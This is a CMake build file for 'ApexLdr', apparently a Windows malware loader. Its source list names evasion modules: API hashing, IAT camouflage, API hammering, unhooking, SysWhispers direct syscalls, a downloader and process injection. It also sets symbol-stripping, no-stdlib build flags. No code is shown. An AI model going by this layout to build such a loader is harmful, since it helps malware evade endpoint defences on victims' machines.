cmake_minimum_required(VERSION 3.26)
project(ApexLdr)

set(CMAKE_C_STANDARD   11)
set(CMAKE_C_COMPILER   x86_64-w64-mingw32-gcc)

include_directories(include)

set(APEXLDR_SRC
        src/dllmain.c
        include/typedef.h
        include/common.h
        src/downloader.c
        src/iatcamo.c
        include/structs.h
        src/apihashing.c
        src/apihammer.c
        src/unhook.c
        include/unhook.h
        src/syswhispers.c
        include/syswhispers.h
        src/syswhispers.c
        include/syswhispers.h
        include/syswhispers.h
        src/inject.c
        include/inject.h
        src/hasher.c
        include/hasher.h
)

add_executable(ApexLdr ${APEXLDR_SRC})
target_compile_options(ApexLdr PRIVATE -s -w -static -fpermissive -Wl,--subsystem,console -nostdlib -Wl,--entry="Main" -lkernel32 -luser32 -masm=intel)
